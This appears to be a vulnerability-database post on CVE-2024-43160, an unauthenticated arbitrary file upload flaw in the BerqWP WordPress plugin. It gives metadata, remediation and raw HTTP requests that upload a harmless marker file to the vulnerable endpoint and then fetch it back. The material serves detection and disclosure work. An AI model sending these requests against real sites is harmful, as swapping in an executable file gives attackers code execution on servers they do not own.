---
layout: post
cve_id: CVE-2024-43160
title: BerqWP <= 1.7.6 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2024/CVE-2024-43160.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-43160.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary files to achieve remote code
  execution on the WordPress server.

  '
remediation: 'Update BerqWP plugin to version 1.7.7 or later.

  '
reference:
- https://github.com/KTN1990/CVE-2024-43160
- https://nvd.nist.gov/vuln/detail/CVE-2024-43160
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/searchpro/berqwp-176-unauthenticated-arbitrary-file-uplaod
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2024-43160
  cwe-id: CWE-434
  epss-score: 0.83713
  epss-percentile: 0.9926
metadata:
  verified: true
  max-request: 3
  vendor: BerqWP
  product: BerqWP
  framework: wordpress
  publicwww-query: /wp-content/plugins/searchpro
tags:
- cve
- cve2024
- file-upload
- shell
- intrusive
- wp
- wp-plugin
- wordpress
- searchpro
- vuln
---

## ðŸ” Vulnerability Description
The BerqWP Automated All-In-One PageSpeed Optimization Plugin for Core Web Vitals, Cache, CDN, Images, CSS, and JavaScript plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the /api/store_webp.php file in all versions up to, and including, 1.7.6. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-json/optifer/v1/store-webp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 83
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
image="NzY1OQ=="&url=TfGMIqJA.txt&license_key_hash=d41d8cd98f00b204e9800998ecf8427e
```

```nohighlight
GET /TfGMIqJA.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; ja-jp) AppleWebKit/523.12.2 (KHTML, like Gecko) Version/3.0.4 Safari/523.12.2
Connection: close
Accept-Encoding: gzip
```

